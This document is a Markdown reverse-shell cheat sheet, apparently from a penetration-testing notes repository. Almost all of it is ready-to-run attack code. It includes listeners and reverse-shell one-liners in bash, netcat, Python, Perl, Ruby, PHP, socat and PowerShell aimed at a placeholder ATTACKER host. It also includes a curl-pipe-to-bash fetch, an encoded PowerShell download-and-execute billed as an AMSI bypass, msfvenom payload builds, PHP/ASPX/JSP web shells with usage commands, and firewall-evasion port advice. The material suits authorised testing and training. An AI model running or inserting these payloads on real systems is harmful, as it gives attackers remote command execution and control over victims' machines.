# 💻 Reverse Shells Reference

> **All shell types, listeners, and upgrade methods in one place.**  
> See also: [04_exploitation/03_shell_techniques.md](../04_exploitation/03_shell_techniques.md)

---

## Listeners (Start First!)

```bash
# Netcat (basic)
nc -nvlp 4444

# Netcat with rlwrap (arrow keys work)
rlwrap nc -nvlp 4444

# Socat (fully interactive)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Pwncat (auto-upgrades shell)
pwncat-cs -lp 4444

# Metasploit multi/handler
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp   # or windows equivalent
set LHOST tun0
set LPORT 4444
run
```

---

## Linux Shells

| Shell | Command |
|---|---|
| bash | `bash -i >& /dev/tcp/ATTACKER/4444 0>&1` |
| sh | `sh -i >& /dev/tcp/ATTACKER/4444 0>&1` |
| nc (with -e) | `nc -e /bin/bash ATTACKER 4444` |
| nc (without -e) | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc ATTACKER 4444 >/tmp/f` |
| python3 | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| python2 | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| perl | `perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| ruby | `ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| php | `php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| socat (interactive) | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444` |
| curl pipe | `curl http://ATTACKER/shell.sh \| bash` |

---

## Windows Shells

### PowerShell (Most Common)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Encoded (AMSI/Restrictions Bypass)

```bash
# Generate on attacker:
echo 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER/shell.ps1")' | iconv -t UTF-16LE | base64 -w 0

# Run on target:
powershell -EncodedCommand <base64_output>
```

### msfvenom Payloads

```bash
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o shell.dll

# Windows PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f ps1 -o shell.ps1

# HTA
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o shell.hta

# ASP web shell
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f asp -o shell.asp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw -o shell.php
```

---

## Web Shells

### PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php passthru($_GET['c']); ?>
<?php eval($_POST['code']); ?>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<% var p = new System.Diagnostics.Process(); p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request["cmd"]; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
```

### JSP

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### Usage

```bash
curl "http://IP/shell.php?cmd=id"
curl "http://IP/shell.php?cmd=whoami"
# Trigger reverse shell (URL encode the shell command):
curl "http://IP/shell.php" --data-urlencode "cmd=bash -i >& /dev/tcp/ATTACKER/4444 0>&1"
```

---

## Shell Upgrade — Linux (Full TTY)

### Method 1: Python PTY (Most Common)

```bash
# Step 1 — in reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (try python if python3 doesn't exist)

# Step 2 — Ctrl+Z to background

# Step 3 — on attacker:
stty raw -echo; fg

# Step 4 — press Enter twice

# Step 5 — set terminal size:
export TERM=xterm-256color
stty rows 40 columns 160
```

### Method 2: Script

```bash
script /dev/null -c bash
# Then Ctrl+Z, stty raw -echo; fg, Enter Enter
```

### Method 3: Socat (Best Quality)

```bash
# Attacker (starts listener):
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target (from existing shell):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

---

## Shell Upgrade — Windows

```cmd
REM Upgrade CMD to PowerShell
powershell -ep bypass

REM ConPtyShell (fully interactive PS)
IEX(IWR http://ATTACKER/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell ATTACKER 4445
```

---

## Common Ports for Shells

When standard ports are blocked, use these:

| Port | Reason it works |
|---|---|
| 80 | HTTP — almost always allowed outbound |
| 443 | HTTPS — almost always allowed |
| 53 | DNS — often allowed even in strict environments |
| 8080 | Alternate HTTP — common |
| 8443 | Alternate HTTPS |
| 22 | SSH — often allowed |

---

## 🔗 References

- [Revshells.com](https://www.revshells.com) — Interactive shell generator
- [PayloadsAllTheThings — Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [pwncat GitHub](https://github.com/calebstewart/pwncat)
- [ConPtyShell GitHub](https://github.com/antonioCoco/ConPtyShell)

---

*[← File Transfers](./file_transfers.md) · [Quick Reference Hub](./README.md) · [Troubleshooting →](./troubleshooting.md)*
